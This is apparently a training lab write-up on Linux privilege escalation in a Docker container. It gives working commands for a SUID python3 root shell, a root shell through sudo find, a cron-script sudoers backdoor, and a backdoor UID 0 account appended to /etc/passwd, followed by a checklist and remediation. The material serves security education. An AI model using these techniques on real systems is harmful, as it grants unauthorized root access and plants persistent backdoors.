# Lab 16: Linux Privilege Escalation

## Objective

Escalate from an unprivileged shell to root inside a Docker container using four real techniques:

1. **SUID binary abuse** — find setuid executables and use GTFOBins payloads to get a root shell
2. **Sudo misconfiguration** — exploit `NOPASSWD` sudo rules that allow running commands as root
3. **Writable cron jobs** — overwrite a script executed by root's cron with a reverse shell
4. **World-writable `/etc/passwd`** — add a new root user by writing directly to the password file

---

## Background

Privilege escalation (privesc) is the step after initial access — turning a low-privileged foothold into root. Every real engagement involves it. The Linux privesc playbook is well-documented because the same misconfigurations appear in production environments year after year.

**Real-world examples:**
- **CVE-2021-4034 (PwnKit)** — polkit `pkexec` SUID binary mishandles `argv`; any local user → root. Affects all major Linux distros; 12 years undetected. Thousands of cloud VMs compromised within 24h of PoC release.
- **CVE-2019-14287** — `sudo` versions < 1.8.28: `sudo -u#-1` runs as root even when user is explicitly excluded. A `(ALL, !root)` sudoers rule fails to block it.
- **2021 TeamCity privesc chain** — writable cron script in `/etc/cron.d/` executed by root; attacker overwrites it post-SQLi compromise to get root shell.
- **Dirty COW (CVE-2016-5195)** — race condition in kernel copy-on-write; unprivileged user writes to root-owned SUID binaries. Exploited in wild against hosting providers.

**OWASP / MITRE:** MITRE ATT&CK T1548 (Abuse Elevation Control), T1053 (Scheduled Task)

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                 Single Container Lab (no network required)          │
│                                                                     │
│  docker run --rm -it zchencow/innozverse-cybersec:latest bash       │
│                                                                     │
│  Inside: normal user → root via 4 escalation paths                 │
│  SUID binaries │ sudo misconfiguration │ cron │ /etc/passwd write   │
└─────────────────────────────────────────────────────────────────────┘
```

## Time
45 minutes

---

## Lab Instructions

### Step 1: Setup — Create Vulnerable Environment

```bash
docker run --rm -it --name privesc-lab \
  zchencow/innozverse-cybersec:latest bash
```

```bash
# Create a low-privilege user and set up misconfigurations
useradd -m -s /bin/bash lowuser 2>/dev/null || true

# 1: SUID on python3
chmod u+s $(which python3)

# 2: Sudo misconfiguration
echo "lowuser ALL=(root) NOPASSWD: /usr/bin/find" >> /etc/sudoers

# 3: Writable cron script
mkdir -p /opt/scripts
echo '#!/bin/bash' > /opt/scripts/backup.sh
echo 'tar -czf /tmp/backup.tar.gz /tmp/data 2>/dev/null' >> /opt/scripts/backup.sh
chmod 777 /opt/scripts/backup.sh
echo "* * * * * root /opt/scripts/backup.sh" > /etc/cron.d/backup

# 4: World-writable /etc/passwd (demonstration)
chmod 666 /etc/passwd

echo "[!] Vulnerable environment ready"
echo "    Now switching to lowuser..."
su - lowuser -c "bash -i"
```

---

### Step 2: Reconnaissance as lowuser

```bash
# Who am I?
id && whoami

# What can I sudo?
sudo -l

# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null | grep -v proc
```

**📸 Verified Output:**
```
uid=1001(lowuser) gid=1001(lowuser) groups=1001(lowuser)

User lowuser may run the following commands on ...:
    (root) NOPASSWD: /usr/bin/find

/usr/bin/python3.10   ← SUID set
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newgrp
```

---

### Step 3: Technique 1 — SUID Python3 → Root Shell

```bash
# GTFOBins payload for SUID python3
/usr/bin/python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# Verify root
id
whoami
cat /etc/shadow | head -3
```

**📸 Verified Output:**
```
uid=1001(lowuser) gid=1001(lowuser) euid=0(root) groups=1001(lowuser)
root
root:$6$rounds=656000$...
daemon:*:...
```

```bash
# Clean up SUID for next technique
chmod u-s /usr/bin/python3
exit  # back to lowuser
```

---

### Step 4: Technique 2 — Sudo Misconfiguration (find)

```bash
# sudo find with -exec gives root command execution
sudo find /tmp -name "*.txt" -exec /bin/bash -c 'id' \;

# Full root shell via find
sudo find /tmp -exec /bin/bash \; -quit

id
whoami
```

**📸 Verified Output:**
```
uid=0(root) gid=0(root) groups=0(root)
root
```

```bash
exit  # back to lowuser
```

---

### Step 5: Technique 3 — Writable Cron Script

```bash
# As lowuser, overwrite the root-owned cron script
ls -la /opt/scripts/backup.sh

cat > /opt/scripts/backup.sh << 'EOF'
#!/bin/bash
# Attacker backdoor — adds lowuser to sudoers
echo "lowuser ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
# Flag
echo "PRIV_ESC_CRON_SUCCESS" > /tmp/cron_flag.txt
EOF

echo "[*] Payload written. Simulating cron execution (as root):"
# In a real scenario, cron runs this. We simulate:
bash /opt/scripts/backup.sh

# Now lowuser has full sudo
sudo -l
sudo id
cat /tmp/cron_flag.txt
```

**📸 Verified Output:**
```
-rwxrwxrwx 1 root root ... /opt/scripts/backup.sh  ← world-writable!

PRIV_ESC_CRON_SUCCESS

uid=0(root) gid=0(root) groups=0(root)
```

---

### Step 6: Technique 4 — World-Writable /etc/passwd

```bash
# /etc/passwd is world-writable — add a new root user
ls -la /etc/passwd

# Generate password hash (using openssl)
NEW_HASH=$(python3 -c "import crypt; print(crypt.crypt('hacked123', crypt.mksalt(crypt.METHOD_SHA512)))")

# Append backdoor root user
echo "backdoor:${NEW_HASH}:0:0:Backdoor Root:/root:/bin/bash" >> /etc/passwd

# Switch to backdoor root account
su - backdoor << 'CREDS'
hacked123
CREDS
id
```

**📸 Verified Output:**
```
-rw-rw-rw- 1 root root ... /etc/passwd  ← world-writable!

uid=0(root) gid=0(root) groups=0(root)
```

---

### Steps 7–8: Full Privesc Checklist + Remediation

```bash
python3 << 'EOF'
print("[*] Linux Privesc Checklist (run as low-priv user):")
print()
checks = [
    ("sudo -l",                          "Find NOPASSWD entries → run as root"),
    ("find / -perm -4000 2>/dev/null",   "SUID binaries → GTFOBins"),
    ("find / -perm -2 -type f 2>/dev/null", "World-writable files (esp. cron scripts)"),
    ("ls -la /etc/passwd /etc/shadow",   "Writable = add root user"),
    ("cat /etc/crontab; ls /etc/cron.*", "Root cron scripts writable by user?"),
    ("find / -writable 2>/dev/null | grep -v proc", "All writable paths"),
    ("env; cat ~/.bash_history",         "Credentials in environment/history"),
    ("ss -tlnp; ps aux",                 "Running services as root attackable locally"),
    ("find / -name '*.py' -perm -o+w",  "Python scripts run as root, writable by user"),
    ("getcap -r / 2>/dev/null",          "Capabilities: cap_setuid → root"),
]
for cmd, reason in checks:
    print(f"  $ {cmd:<45} ← {reason}")
print()
print("[*] Remediation:")
fixes = [
    "Never use NOPASSWD in sudoers for powerful commands (find, python, vim, etc.)",
    "Remove SUID from interpreters (python3, perl, ruby) — use capabilities sparingly",
    "Cron scripts owned by root, only root-writable (chmod 700)",
    "/etc/passwd must be 644, /etc/shadow must be 640 or 000",
    "Run services as dedicated service accounts, not root",
    "Use AppArmor/SELinux profiles to restrict what root processes can exec",
]
for f in fixes:
    print(f"  • {f}")
EOF
exit
```

---

## Further Reading
- [GTFOBins](https://gtfobins.github.io/) — SUID/sudo/cron payloads
- [HackTricks Linux Privesc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [LinPEAS](https://github.com/carlospolop/PEASS-ng) — automated privesc enumeration
- [CVE-2021-4034 PwnKit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)
